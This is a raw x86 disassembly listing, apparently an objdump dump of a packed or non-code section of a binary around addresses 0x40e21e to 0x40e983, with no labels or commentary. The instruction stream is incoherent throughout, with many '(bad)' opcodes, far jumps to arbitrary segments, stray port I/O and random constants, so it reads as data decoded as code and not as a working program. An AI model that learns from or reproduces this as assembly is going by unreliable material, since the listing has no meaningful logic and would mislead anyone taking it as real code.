  40e21e:	xchg   DWORD PTR [esi],esi
  40e220:	and    ah,BYTE PTR [esi+0x6bb0f030]
  40e226:	sbb    dh,BYTE PTR [edx]
  40e228:	mov    edi,0xbea1e074
  40e22d:	retf   
  40e22e:	and    al,0x3b
  40e230:	jo     0x40e263
  40e232:	fwait
  40e233:	or     bh,BYTE PTR [ebx-0x366685ef]
  40e239:	pop    es
  40e23a:	cmp    ecx,ebp
  40e23c:	nop
  40e23d:	push   esi
  40e23e:	inc    ebp
  40e23f:	repz sub eax,0x3b900544
  40e245:	push   ebx
  40e246:	sub    DWORD PTR [ecx],ecx
  40e248:	push   eax
  40e249:	add    al,0x66
  40e24b:	cwde   
  40e24c:	mov    al,ds:0x3cebdde5
  40e251:	pop    eax
  40e252:	(bad)  
  40e253:	stc    
  40e254:	stc    
  40e255:	push   ebx
  40e256:	jle    0x40e265
  40e258:	cs mov ebp,0x97896527
  40e25e:	jmp    0xd916:0x5bb1a8eb
  40e265:	ror    BYTE PTR [eax],1
  40e267:	(bad)  
  40e268:	ds jb  0x40e223
  40e26b:	fs (bad) 
  40e26d:	inc    ebx
  40e26e:	xor    ebx,DWORD PTR [edi+0x4b577821]
  40e274:	jge    0x40e211
  40e276:	dec    eax
  40e277:	cmc    
  40e278:	pusha  
  40e279:	xor    edi,ecx
  40e27b:	adc    al,0xd1
  40e27d:	cmp    bl,dh
  40e27f:	cmp    eax,0x742917de
  40e284:	dec    eax
  40e285:	lock rcr BYTE PTR [ebx+ebx*2-0x60],cl
  40e28a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e28b:	mov    ah,0xf1
  40e28d:	mov    esp,DWORD PTR [ecx-0x212ba232]
  40e293:	(bad)  
  40e295:	retf   0x8c68
  40e298:	js     0x40e2c6
  40e29a:	sub    DWORD PTR [bx+di+0xf9],eax
  40e29f:	lahf   
  40e2a0:	ins    BYTE PTR es:[edi],dx
  40e2a1:	outs   dx,DWORD PTR ds:[esi]
  40e2a2:	das    
  40e2a3:	dec    eax
  40e2a4:	mov    al,ds:0x11ab9881
  40e2a9:	fs add al,0x71
  40e2ac:	xchg   BYTE PTR [ebp-0x4d4b5fda],dl
  40e2b2:	stos   DWORD PTR es:[edi],eax
  40e2b3:	test   al,0xf4
  40e2b5:	jo     0x40e28a
  40e2b7:	inc    edi
  40e2b8:	sbb    ebp,DWORD PTR [ecx+0x2e]
  40e2bb:	mov    ebx,0x17c99701
  40e2c0:	cli    
  40e2c1:	mov    bl,0x1c
  40e2c3:	shl    dl,cl
  40e2c5:	div    DWORD PTR [ebp+0x42]
  40e2c8:	sar    DWORD PTR ds:0x861151ca,1
  40e2ce:	or     al,BYTE PTR [ebp-0x35623acb]
  40e2d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2d5:	adc    al,bh
  40e2d7:	stc    
  40e2d8:	ins    BYTE PTR es:[edi],dx
  40e2d9:	(bad)  
  40e2db:	dec    edi
  40e2dc:	nop
  40e2dd:	jmp    0xa14a:0x79dd808c
  40e2e4:	addr16 pop ecx
  40e2e6:	mov    ds:0x7b7f8407,eax
  40e2eb:	sub    al,0xb1
  40e2ed:	bound  esi,QWORD PTR [edx+ebp*1]
  40e2f0:	into   
  40e2f1:	xchg   ebx,eax
  40e2f2:	bnd js 0x40e321
  40e2f5:	mov    BYTE PTR [edx+ecx*4-0x3fddb42f],dl
  40e2fc:	push   ebx
  40e2fd:	ret    
  40e2fe:	and    BYTE PTR [edx],0x29
  40e301:	jg     0x40e373
  40e303:	sub    al,0xfe
  40e305:	pushf  
  40e306:	mov    esi,0xda43644c
  40e30b:	sbb    al,0x4c
  40e30d:	retf   0x1481
  40e310:	push   ebp
  40e311:	mov    edx,esi
  40e313:	arpl   bp,bx
  40e315:	inc    esi
  40e316:	clc    
  40e317:	call   FWORD PTR [ecx]
  40e319:	int3   
  40e31a:	dec    esi
  40e31b:	xor    ecx,DWORD PTR [ebx]
  40e31d:	mov    ds:0x264a1efa,al
  40e322:	mov    edi,0x7e9dad7f
  40e327:	and    al,0x4a
  40e329:	adc    bl,ah
  40e32b:	push   edx
  40e32c:	test   eax,0xba29221a
  40e331:	imul   ebp,DWORD PTR [eax-0x3f],0x91efac51
  40e338:	cmp    BYTE PTR ds:0xc6613ccb,cl
  40e33e:	iret   
  40e33f:	lock loopne 0x40e34c
  40e342:	add    eax,0x47f46d35
  40e347:	pop    ecx
  40e348:	or     DWORD PTR [eax-0x2c7be9e7],esi
  40e34e:	and    esp,edi
  40e350:	retf   0xf0e0
  40e353:	mov    DWORD PTR [edi-0x637d8358],ebp
  40e359:	imul   esi,DWORD PTR [eax+0x6b],0x57
  40e35d:	push   edi
  40e35e:	inc    ebp
  40e35f:	inc    eax
  40e360:	fs pop ebp
  40e362:	fst    DWORD PTR cs:[edi+0x5d]
  40e366:	jp     0x40e364
  40e368:	mov    esp,0x7964da99
  40e36d:	and    BYTE PTR cs:[esi+0x18],dl
  40e371:	test   DWORD PTR [edx+0x71],eax
  40e374:	in     eax,dx
  40e375:	and    eax,0x5d57b415
  40e37a:	push   edx
  40e37b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e37c:	add    DWORD PTR [esi],edx
  40e37e:	lods   al,BYTE PTR ds:[esi]
  40e37f:	jecxz  0x40e37c
  40e381:	add    al,0xaa
  40e383:	xchg   edx,eax
  40e384:	xchg   ebp,eax
  40e385:	retf   
  40e386:	pop    ebx
  40e387:	call   0xac6f:0x78f89535
  40e38e:	ret    0x8aa1
  40e391:	sbb    eax,0xb57eecfd
  40e396:	adc    eax,0x7c32d3a1
  40e39b:	(bad)  
  40e39c:	popf   
  40e39d:	fisttp WORD PTR [ecx+eax*2-0x5e]
  40e3a1:	adc    dl,ch
  40e3a3:	in     eax,dx
  40e3a4:	cld    
  40e3a5:	add    cl,ah
  40e3a7:	dec    edi
  40e3a8:	jbe    0x40e3ee
  40e3aa:	xlat   BYTE PTR ds:[ebx]
  40e3ab:	push   es
  40e3ac:	mov    bh,0x9a
  40e3ae:	jmp    0x40e35f
  40e3b0:	cdq    
  40e3b1:	ins    BYTE PTR es:[edi],dx
  40e3b2:	ins    BYTE PTR es:[edi],dx
  40e3b3:	popf   
  40e3b4:	imul   edx
  40e3b6:	mov    es,WORD PTR [eax+eiz*4+0x64]
  40e3ba:	push   edi
  40e3bb:	sub    BYTE PTR [ebp+0x56ccf8ff],dh
  40e3c1:	or     BYTE PTR [ecx+0x47],0xe5
  40e3c5:	and    dl,BYTE PTR [edx*1+0x3774b2c8]
  40e3cc:	mov    cs,WORD PTR [edx+0x54]
  40e3cf:	ins    BYTE PTR es:[edi],dx
  40e3d0:	fcom   QWORD PTR [ecx]
  40e3d2:	(bad)  
  40e3d3:	or     eax,DWORD PTR [eax+0x59]
  40e3d6:	lods   eax,DWORD PTR ds:[esi]
  40e3d7:	push   cs
  40e3d8:	xor    ch,BYTE PTR [eax-0x54568016]
  40e3de:	jo     0x40e3f3
  40e3e0:	mov    al,ds:0x349bd276
  40e3e5:	pop    ds
  40e3e6:	sub    cl,BYTE PTR [edx]
  40e3e8:	pushf  
  40e3e9:	(bad)  
  40e3ea:	sbb    eax,0x24ff09f6
  40e3ef:	stc    
  40e3f0:	inc    esi
  40e3f1:	push   es
  40e3f2:	retf   
  40e3f3:	mov    dl,BYTE PTR [ebp+0x49]
  40e3f6:	push   ss
  40e3f7:	xchg   esp,eax
  40e3f8:	pop    eax
  40e3f9:	push   edi
  40e3fa:	test   cl,cl
  40e3fc:	xor    eax,0x26c38e36
  40e401:	aam    0x79
  40e403:	push   es
  40e404:	ja     0x40e46a
  40e406:	xor    al,0xd8
  40e408:	xchg   esp,eax
  40e409:	js     0x40e3e9
  40e40b:	and    DWORD PTR [edx+0x2cc74a30],edi
  40e411:	xchg   DWORD PTR [ebp+0x23],edx
  40e414:	aad    0x8e
  40e416:	imul   ebp,DWORD PTR [esi-0x7e756610],0x3f8964cf
  40e420:	(bad)  
  40e421:	and    ebp,DWORD PTR [ebx+0x6f]
  40e424:	mov    ch,0xf4
  40e426:	ins    DWORD PTR es:[edi],dx
  40e427:	xchg   esi,eax
  40e428:	stc    
  40e429:	in     eax,dx
  40e42a:	lds    ecx,FWORD PTR [ebp+0x1eac9b26]
  40e430:	mov    ds:0xd8cb662,eax
  40e435:	lahf   
  40e436:	cmp    edi,DWORD PTR [edx+0x66]
  40e439:	cs inc ecx
  40e43b:	dec    al
  40e43d:	xchg   ecx,eax
  40e43e:	sbb    bh,BYTE PTR [esi+0x12]
  40e441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e442:	cmp    al,0x6e
  40e444:	inc    ebx
  40e445:	add    esi,edx
  40e447:	or     cl,BYTE PTR [ecx+0x5292215d]
  40e44d:	pop    ebp
  40e44e:	jne    0x40e3fd
  40e450:	fwait
  40e451:	cs ss imul esp,esi,0xc233a433
  40e459:	jne    0x40e498
  40e45b:	lea    ebx,[edx]
  40e45d:	les    edx,FWORD PTR [esi+0x6daf65e]
  40e463:	mov    dh,0x1d
  40e465:	js     0x40e414
  40e467:	dec    eax
  40e468:	mov    edi,cs
  40e46a:	dec    esi
  40e46b:	add    DWORD PTR [edi],0x3e15404
  40e471:	pop    ss
  40e472:	mov    ch,ch
  40e474:	xor    al,0xc7
  40e476:	xchg   edi,eax
  40e477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e478:	dec    esp
  40e479:	cli    
  40e47a:	add    eax,0x454f9c39
  40e47f:	cdq    
  40e480:	sar    DWORD PTR [esi-0x3f],0xed
  40e484:	aaa    
  40e485:	jmp    0x40e4d7
  40e487:	scas   eax,DWORD PTR es:[edi]
  40e488:	jns    0x40e473
  40e48a:	ja     0x40e445
  40e48c:	test   eax,0xcbaa68f3
  40e491:	or     eax,0x16dc625d
  40e496:	cmp    esp,edi
  40e498:	push   0xc36a86c5
  40e49d:	add    ah,al
  40e49f:	mov    ds:0xb73b0e89,al
  40e4a4:	sbb    DWORD PTR [ebx-0x3acda790],ebx
  40e4aa:	inc    dl
  40e4ac:	xchg   esi,esi
  40e4ae:	xlat   BYTE PTR ds:[ebx]
  40e4af:	fs pandn mm1,mm6
  40e4b3:	xchg   edi,eax
  40e4b4:	jb     0x40e515
  40e4b6:	mov    bh,0xc4
  40e4b8:	test   DWORD PTR [edi+0x32],0xc0985f20
  40e4bf:	loopne 0x40e4e4
  40e4c1:	fild   WORD PTR [ecx+esi*1]
  40e4c4:	and    bh,BYTE PTR [eax+0x24]
  40e4c7:	mov    DWORD PTR [ebx-0x135dc254],esi
  40e4cd:	je     0x40e4a5
  40e4cf:	aam    0x98
  40e4d1:	pop    ss
  40e4d2:	add    al,0x3f
  40e4d4:	hlt    
  40e4d5:	loopne 0x40e47a
  40e4d7:	xchg   ebp,eax
  40e4d8:	pop    ds
  40e4d9:	js     0x40e548
  40e4db:	iret   
  40e4dc:	test   al,0x50
  40e4de:	inc    eax
  40e4df:	jns    0x40e4d6
  40e4e1:	pop    ebx
  40e4e2:	xchg   ebx,eax
  40e4e3:	pop    edx
  40e4e4:	cmovns ebx,DWORD PTR [ebp+ebx*2+0x21]
  40e4e9:	cmp    esi,DWORD PTR [ebp+0x2f6d92c]
  40e4ef:	dec    esi
  40e4f0:	pop    eax
  40e4f1:	scas   eax,DWORD PTR es:[edi]
  40e4f2:	push   cs
  40e4f3:	loope  0x40e4aa
  40e4f5:	adc    bl,BYTE PTR [ecx]
  40e4f7:	add    eax,0x631983de
  40e4fc:	pop    edx
  40e4fd:	aad    0x93
  40e4ff:	xchg   ecx,eax
  40e500:	jp     0x40e494
  40e502:	push   edx
  40e503:	or     DWORD PTR [ecx+edi*4],esp
  40e506:	out    dx,al
  40e507:	daa    
  40e508:	xchg   ecx,eax
  40e509:	sti    
  40e50a:	mov    ch,0x3c
  40e50c:	in     al,dx
  40e50d:	call   0xd355abee
  40e512:	loop   0x40e554
  40e514:	xchg   BYTE PTR ds:0xb56d4b46,cl
  40e51a:	xchg   ecx,eax
  40e51b:	push   0x9342c415
  40e520:	mov    bh,0xde
  40e522:	ja     0x40e572
  40e524:	push   ds
  40e525:	jl     0x40e50f
  40e527:	add    edi,esi
  40e529:	sub    eax,0x11524881
  40e52e:	and    dh,BYTE PTR [ebx]
  40e530:	jne    0x40e590
  40e532:	ins    DWORD PTR es:[edi],dx
  40e533:	retf   0x2ede
  40e536:	fs daa 
  40e538:	jmp    0xea18:0xe9259be5
  40e53f:	out    dx,al
  40e540:	repz mov gs:0x97c1b761,al
  40e547:	xchg   edx,eax
  40e548:	push   eax
  40e549:	pop    esi
  40e54a:	out    0x64,eax
  40e54c:	mov    dh,0x19
  40e54e:	aad    0x10
  40e550:	dec    ecx
  40e551:	push   edi
  40e552:	mov    DWORD PTR [ebx+0x49],0xc3550e5b
  40e559:	cmp    al,0xcc
  40e55b:	std    
  40e55c:	pop    ds
  40e55d:	dec    edi
  40e55e:	into   
  40e55f:	stos   DWORD PTR es:[edi],eax
  40e560:	call   0xf9c15bb6
  40e565:	add    eax,0xdae4874c
  40e56a:	xlat   BYTE PTR ds:[ebx]
  40e56b:	out    0x59,al
  40e56d:	or     eax,DWORD PTR [eax+0x66]
  40e570:	push   edx
  40e571:	stos   DWORD PTR es:[edi],eax
  40e572:	(bad)  
  40e573:	sub    eax,0x28410002
  40e578:	xor    DWORD PTR [esi],ecx
  40e57a:	mov    WORD PTR [edx-0x43],?
  40e57d:	sbb    dh,ah
  40e57f:	fdiv   st(2),st
  40e581:	lahf   
  40e582:	add    bh,BYTE PTR [edx-0xd8efad5]
  40e588:	iret   
  40e589:	xlat   BYTE PTR ds:[ebx]
  40e58a:	cli    
  40e58b:	adc    eax,0xc00df12
  40e590:	and    al,0x3e
  40e592:	add    DWORD PTR [edi-0x1cd62059],eax
  40e598:	stc    
  40e599:	pushf  
  40e59a:	push   ds
  40e59b:	mov    cl,0x46
  40e59d:	fmul   st(5),st
  40e59f:	lods   al,BYTE PTR ds:[esi]
  40e5a0:	out    dx,eax
  40e5a1:	and    ah,BYTE PTR [edi]
  40e5a3:	xchg   ebx,eax
  40e5a4:	js     0x40e52c
  40e5a6:	adc    edx,edi
  40e5a8:	fnstsw WORD PTR [ecx-0x79]
  40e5ab:	jmp    0x239:0x6a1e4434
  40e5b2:	fcomip st,st(4)
  40e5b4:	repz and dh,BYTE PTR ds:0xa46cb43c
  40e5bb:	retf   0xea84
  40e5be:	in     al,dx
  40e5bf:	fidiv  DWORD PTR [edx]
  40e5c1:	mov    ah,0xa9
  40e5c3:	mov    ebx,DWORD PTR [edx]
  40e5c5:	and    eax,0x337c678a
  40e5ca:	fmul   DWORD PTR ds:0xa4939f79
  40e5d0:	dec    ecx
  40e5d1:	mov    ah,0xbf
  40e5d3:	test   BYTE PTR [esi],ah
  40e5d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5d6:	mov    ds:0xb545d516,al
  40e5db:	jecxz  0x40e5e4
  40e5dd:	mov    ch,0x43
  40e5df:	fucomi st,st(5)
  40e5e1:	xlat   BYTE PTR ds:[ebx]
  40e5e2:	aad    0x47
  40e5e4:	jae    0x40e5e0
  40e5e6:	jnp    0x40e5a4
  40e5e8:	mov    bl,BYTE PTR [edx]
  40e5ea:	call   0xe9c96f18
  40e5ef:	retf   0xe750
  40e5f2:	add    DWORD PTR [ebx-0x1b],esp
  40e5f5:	push   esp
  40e5f6:	pop    esi
  40e5f7:	sti    
  40e5f8:	xor    BYTE PTR [edx+0x1d],bh
  40e5fb:	add    eax,0x25f27484
  40e600:	xlat   BYTE PTR ds:[ebx]
  40e601:	pop    ebx
  40e602:	outs   dx,DWORD PTR ds:[esi]
  40e603:	add    BYTE PTR [ebx],0xdf
  40e606:	xchg   edi,eax
  40e607:	dec    edx
  40e608:	xrelease xchg BYTE PTR [esi-0x17],al
  40e60c:	mov    dh,0xdd
  40e60e:	xor    bl,BYTE PTR [edx+0x2021a0b7]
  40e614:	ds add al,0x13
  40e617:	xor    esp,edi
  40e619:	rol    BYTE PTR [eax+ecx*1-0x44],cl
  40e61d:	push   edx
  40e61e:	adc    eax,0xc5b260f4
  40e623:	fdivr  QWORD PTR cs:[ebp-0x31]
  40e627:	dec    ecx
  40e628:	imul   ebp,edi,0x91376da4
  40e62e:	sbb    edx,esp
  40e630:	clc    
  40e631:	push   cs
  40e632:	xor    eax,0x34b0e1b
  40e637:	scas   al,BYTE PTR es:[edi]
  40e638:	lods   eax,DWORD PTR ds:[esi]
  40e639:	nop
  40e63a:	dec    ebx
  40e63b:	test   al,0x1f
  40e63d:	add    ch,BYTE PTR [edi-0x16]
  40e640:	imul   edi,DWORD PTR [esi-0x15],0xffffffe0
  40e644:	push   0x896f3953
  40e649:	aas    
  40e64a:	ror    ch,1
  40e64c:	mov    gs,WORD PTR [ebp+0x7c]
  40e64f:	dec    ebx
  40e650:	dec    edi
  40e651:	cmp    ah,BYTE PTR [ebx+0x42]
  40e654:	xchg   edx,eax
  40e655:	or     ebp,ecx
  40e657:	in     eax,dx
  40e658:	out    dx,eax
  40e659:	outs   dx,DWORD PTR ds:[esi]
  40e65a:	pop    ebp
  40e65b:	or     al,0xab
  40e65d:	sbb    edx,esp
  40e65f:	or     eax,DWORD PTR [ecx-0x51e12177]
  40e665:	lock push es
  40e667:	and    ebx,DWORD PTR [eax]
  40e669:	cmp    edi,ecx
  40e66b:	xchg   DWORD PTR [ebp+0x55],esp
  40e66e:	push   cs
  40e66f:	hlt    
  40e670:	fcomp  QWORD PTR [ebp-0x32954fd7]
  40e676:	fs inc eax
  40e678:	push   ss
  40e679:	mov    WORD PTR [edi-0x6d],?
  40e67c:	fimul  WORD PTR [ebx-0x389cf870]
  40e682:	into   
  40e683:	test   eax,0xf81bfe74
  40e688:	inc    esi
  40e689:	out    dx,al
  40e68a:	mov    eax,ds:0x13205aca
  40e68f:	sub    esi,ecx
  40e691:	pop    esp
  40e692:	xchg   BYTE PTR [ecx],ah
  40e694:	jne    0x40e698
  40e696:	fisub  WORD PTR [edi]
  40e698:	iret   
  40e699:	sti    
  40e69a:	and    ecx,0xffffffd6
  40e69d:	adc    eax,0xc6dbcab2
  40e6a2:	or     DWORD PTR [ebx],edx
  40e6a4:	mov    bh,BYTE PTR [esi+0x45d2d548]
  40e6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6ab:	inc    edi
  40e6ac:	mov    ds:0x6fac0bb9,eax
  40e6b1:	(bad)  
  40e6b2:	jg     0x40e641
  40e6b4:	js     0x40e6e4
  40e6b6:	push   esi
  40e6b7:	test   DWORD PTR [ebp-0x683bef02],0x8bad7da8
  40e6c1:	imul   eax,DWORD PTR [edx+0x2e6053b7],0xffffffa5
  40e6c8:	aam    0x52
  40e6ca:	pop    esp
  40e6cb:	jns    0x40e70f
  40e6cd:	and    BYTE PTR [eax*2+0x53da2a21],0xfd
  40e6d5:	lds    ecx,FWORD PTR [edx-0x7b604d52]
  40e6db:	adc    eax,0x7f471d0f
  40e6e0:	dec    edi
  40e6e1:	mov    esi,0xd9eab564
  40e6e6:	sub    esp,0xaf3e085
  40e6ec:	in     al,dx
  40e6ed:	sbb    eax,0x51c3f2f7
  40e6f2:	in     eax,dx
  40e6f3:	cmc    
  40e6f4:	call   0xe41b5ed1
  40e6f9:	adc    BYTE PTR [eax],bl
  40e6fb:	xor    ebp,0x48
  40e6fe:	mov    DWORD PTR [ebx+0x63b8dedf],0xca230a08
  40e708:	int    0x1
  40e70a:	and    al,0x36
  40e70c:	or     al,0xaf
  40e70e:	cmp    BYTE PTR [esi+0x3c],al
  40e711:	xor    cl,al
  40e713:	call   0x16f47842
  40e718:	and    ch,BYTE PTR [edi]
  40e71a:	push   ss
  40e71b:	repz adc eax,0xec06a1e0
  40e721:	pop    ecx
  40e722:	mov    dl,0x62
  40e724:	ins    BYTE PTR es:[edi],dx
  40e725:	push   ss
  40e726:	xor    al,0x4f
  40e728:	push   edx
  40e729:	fstp   TBYTE PTR [ebp-0x70]
  40e72c:	add    BYTE PTR [edx+edx*4-0x58],dl
  40e730:	loop   0x40e79a
  40e732:	das    
  40e733:	bnd jne 0x40e735
  40e736:	mov    bh,BYTE PTR [ebx+0x22]
  40e739:	ror    DWORD PTR [ecx+0x6c],1
  40e73c:	in     eax,dx
  40e73d:	aad    0xa8
  40e73f:	sbb    esi,esp
  40e741:	sub    BYTE PTR [ecx],0xc3
  40e744:	push   ebp
  40e745:	mul    DWORD PTR [eax+0x74]
  40e748:	dec    edi
  40e749:	push   0xfffffff8
  40e74b:	aaa    
  40e74c:	mov    dh,al
  40e74e:	push   es
  40e74f:	loop   0x40e6fe
  40e751:	sbb    BYTE PTR [ebx+0x704392a6],ah
  40e757:	cmc    
  40e758:	xchg   ebx,eax
  40e759:	inc    ecx
  40e75a:	add    ebx,edi
  40e75c:	and    ebp,DWORD PTR [edx-0x45]
  40e75f:	ss iret 
  40e761:	sar    DWORD PTR [ecx-0x5d],0xd9
  40e765:	or     esi,DWORD PTR [esi]
  40e767:	hlt    
  40e768:	xor    eax,DWORD PTR ds:0xdc5cb381
  40e76e:	inc    edx
  40e76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e770:	in     al,dx
  40e771:	mov    edi,0x323a2fce
  40e776:	pop    es
  40e777:	pushf  
  40e778:	cmp    al,0xd6
  40e77a:	ret    0xe817
  40e77d:	pop    es
  40e77e:	inc    ecx
  40e77f:	into   
  40e780:	sti    
  40e781:	mov    ah,0x69
  40e783:	outs   dx,BYTE PTR ds:[esi]
  40e784:	xsavec [edi+edi*1-0x2]
  40e789:	cdq    
  40e78a:	sbb    eax,0xd9639f09
  40e78f:	xchg   edx,eax
  40e790:	jae    0x40e7d6
  40e792:	sub    DWORD PTR [ebx-0x26],esp
  40e795:	inc    esi
  40e796:	push   edx
  40e797:	push   ecx
  40e798:	sbb    eax,0xb1a4d2b0
  40e79d:	out    dx,al
  40e79e:	in     al,0xd3
  40e7a0:	sbb    al,0xba
  40e7a2:	xchg   BYTE PTR ds:0x387d50dc,bh
  40e7a8:	(bad)  
  40e7a9:	lods   eax,DWORD PTR ds:[esi]
  40e7aa:	xor    DWORD PTR [edx+0x6],esp
  40e7ad:	loope  0x40e73d
  40e7af:	push   0x75bcd3f
  40e7b4:	push   es
  40e7b5:	cli    
  40e7b6:	push   esp
  40e7b7:	mov    DWORD PTR [edx-0x50b4f8fb],eax
  40e7bd:	sbb    al,0xe2
  40e7bf:	jno    0x40e809
  40e7c1:	in     eax,dx
  40e7c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7c3:	rcl    BYTE PTR [edi+edi*2],0xc7
  40e7c7:	cs xchg esp,eax
  40e7c9:	cmove  ebx,DWORD PTR [edi]
  40e7cc:	rol    ch,1
  40e7ce:	dec    ebx
  40e7cf:	outs   dx,BYTE PTR ds:[esi]
  40e7d0:	jmp    0x73c7:0xd4798c07
  40e7d7:	xchg   edi,eax
  40e7d8:	dec    edi
  40e7d9:	inc    eax
  40e7da:	pop    edx
  40e7db:	dec    esi
  40e7dc:	jb     0x40e76e
  40e7de:	cmp    eax,DWORD PTR [ebp+0x2f2fe1ea]
  40e7e4:	jo     0x40e831
  40e7e6:	push   esi
  40e7e7:	(bad)  
  40e7e8:	xor    eax,0x7a77c062
  40e7ed:	and    DWORD PTR [edx+0x5c],esp
  40e7f0:	rcr    DWORD PTR [esi],1
  40e7f2:	jmp    0x40e832
  40e7f4:	or     al,0x18
  40e7f7:	sub    DWORD PTR [ebx-0x3d520fa],0x88f90e5f
  40e801:	and    ch,dh
  40e803:	stos   DWORD PTR es:[edi],eax
  40e804:	inc    ebp
  40e805:	lds    edi,FWORD PTR [esi]
  40e807:	sti    
  40e808:	jl     0x40e871
  40e80a:	outs   dx,DWORD PTR ds:[esi]
  40e80b:	mov    ecx,0x286a1042
  40e810:	inc    edx
  40e811:	loop   0x40e83b
  40e813:	xor    BYTE PTR [eiz*1+0x563d237e],al
  40e81a:	sti    
  40e81b:	fwait
  40e81c:	ret    
  40e81d:	adc    edx,DWORD PTR [edx]
  40e81f:	scas   eax,DWORD PTR es:[edi]
  40e820:	sahf   
  40e821:	into   
  40e822:	aas    
  40e823:	sub    al,0x5b
  40e825:	cdq    
  40e826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e827:	sub    al,0x4c
  40e829:	repnz xchg edx,eax
  40e82b:	std    
  40e82c:	xor    al,0x8e
  40e82e:	das    
  40e82f:	add    bl,bl
  40e831:	mov    dh,0x49
  40e833:	sbb    eax,0x718727e4
  40e838:	push   esp
  40e839:	or     DWORD PTR [eax],esp
  40e83b:	stos   DWORD PTR es:[edi],eax
  40e83c:	out    dx,eax
  40e83d:	mov    ds:0x9ae9bc0b,al
  40e842:	push   es
  40e843:	mov    ebp,0x3d293f8f
  40e848:	adc    DWORD PTR [ecx-0x7b],edi
  40e84b:	adc    DWORD PTR [ebp*8-0x6ea67ed0],edx
  40e852:	mov    eax,ds:0x776b4988
  40e857:	sub    al,al
  40e859:	or     DWORD PTR [esp+edx*1+0x27],0x6c
  40e85e:	xchg   esp,eax
  40e85f:	push   ds
  40e860:	cmc    
  40e861:	loop   0x40e854
  40e863:	ins    BYTE PTR es:[edi],dx
  40e864:	mov    esp,eax
  40e866:	jne    0x40e82e
  40e868:	stc    
  40e869:	mov    dh,0xd8
  40e86b:	mov    al,0x21
  40e86d:	sbb    bh,bl
  40e86f:	fnstsw WORD PTR [edx+0x6a]
  40e872:	mov    cl,0x9
  40e874:	add    edi,esp
  40e876:	pushf  
  40e877:	add    al,0x3
  40e879:	jl     0x40e8ac
  40e87b:	cmp    eax,0xc3526eb
  40e880:	mov    ebp,0x4348907c
  40e885:	adc    edx,DWORD PTR [eax]
  40e887:	add    ah,BYTE PTR [ebp+eiz*8-0x628141fa]
  40e88e:	sub    eax,0xd77f89e4
  40e893:	sub    edx,DWORD PTR [eax-0x64]
  40e896:	jne    0x40e911
  40e898:	add    al,BYTE PTR [esi+0x2f]
  40e89b:	inc    edx
  40e89c:	xchg   esp,eax
  40e89d:	sub    dh,BYTE PTR [eax-0x23]
  40e8a0:	mov    esi,0x44ea3f6d
  40e8a5:	push   ebp
  40e8a6:	(bad)  
  40e8a7:	inc    ecx
  40e8a8:	mov    ah,0x4b
  40e8aa:	inc    eax
  40e8ab:	mov    bh,0xc8
  40e8ad:	mov    ecx,0xf9afd136
  40e8b2:	lahf   
  40e8b3:	fsub   QWORD PTR [ebx]
  40e8b5:	icebp  
  40e8b6:	mov    ch,0x14
  40e8b8:	adc    eax,0x6c
  40e8bb:	mov    edi,0xd021132a
  40e8c0:	pop    es
  40e8c1:	add    al,0x3c
  40e8c3:	(bad)  
  40e8c4:	jo     0x40e8d4
  40e8c6:	test   eax,0x7a203965
  40e8cb:	call   0x5fb4:0xd7e78e6b
  40e8d2:	clc    
  40e8d3:	ss out 0xc0,eax
  40e8d6:	xchg   ebx,eax
  40e8d7:	aaa    
  40e8d8:	int    0x45
  40e8da:	inc    eax
  40e8db:	jb     0x40e933
  40e8dd:	mov    bh,BYTE PTR [ebx+0x43]
  40e8e0:	xor    al,0x87
  40e8e2:	xor    DWORD PTR [edx+0x305b0287],ebx
  40e8e8:	mov    DWORD PTR [ebp+0x281c9093],edi
  40e8ee:	cmp    BYTE PTR [eax+0x76c3698d],al
  40e8f4:	test   esi,esp
  40e8f6:	push   edx
  40e8f7:	out    dx,al
  40e8f8:	xchg   esi,eax
  40e8f9:	inc    edi
  40e8fa:	jge    0x40e88e
  40e8fc:	js     0x40e8e9
  40e8fe:	cmp    cl,BYTE PTR [esi-0x71]
  40e901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e902:	hlt    
  40e903:	enter  0x5c6b,0xaf
  40e907:	test   BYTE PTR [ecx+0x74],0x46
  40e90b:	in     eax,0x17
  40e90d:	int3   
  40e90e:	mov    ds,WORD PTR [edi+0x3b]
  40e911:	xchg   esp,eax
  40e912:	adc    edi,ebx
  40e914:	sub    bl,BYTE PTR [eax-0x38eefcfb]
  40e91a:	fs push es
  40e91c:	scas   al,BYTE PTR es:[edi]
  40e91d:	repnz xchg ecx,eax
  40e91f:	dec    esi
  40e920:	jmp    0x40e969
  40e922:	mov    edi,0x51c5838f
  40e927:	outs   dx,DWORD PTR ds:[esi]
  40e928:	sub    eax,0x4301932c
  40e92d:	xchg   esp,eax
  40e92e:	xor    ah,cl
  40e930:	jmp    0xf87a929
  40e935:	inc    esp
  40e936:	fld    TBYTE PTR [edi-0x38]
  40e939:	arpl   WORD PTR gs:[eax],cx
  40e93c:	sbb    ebp,0x56007aaf
  40e942:	xchg   edx,eax
  40e943:	jb     0x40e8e4
  40e945:	shr    DWORD PTR [ebx+edx*1-0x194c435a],cl
  40e94c:	cdq    
  40e94d:	fsub   QWORD PTR [ebx*4-0x993c2cf]
  40e954:	sar    BYTE PTR ds:0xaef777a6,0xb2
  40e95b:	xchg   esi,eax
  40e95c:	popa   
  40e95d:	sbb    DWORD PTR [esi+0x40b144ec],ebx
  40e963:	dec    eax
  40e964:	inc    ebp
  40e965:	cld    
  40e966:	jns    0x40e963
  40e968:	rol    ecx,cl
  40e96a:	and    DWORD PTR [edi],0xffffffcb
  40e96d:	(bad)  
  40e96e:	aam    0xbc
  40e970:	mov    edx,0x21516330
  40e975:	lea    ebp,[ebx-0x57970a6b]
  40e97b:	inc    ah
  40e97d:	pop    eax
  40e97e:	mov    WORD PTR [esi],ds
  40e980:	and    BYTE PTR [esi],bl
  40e982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e983:	adc    BYTE PTR [esi+0x6253ebdc],ah
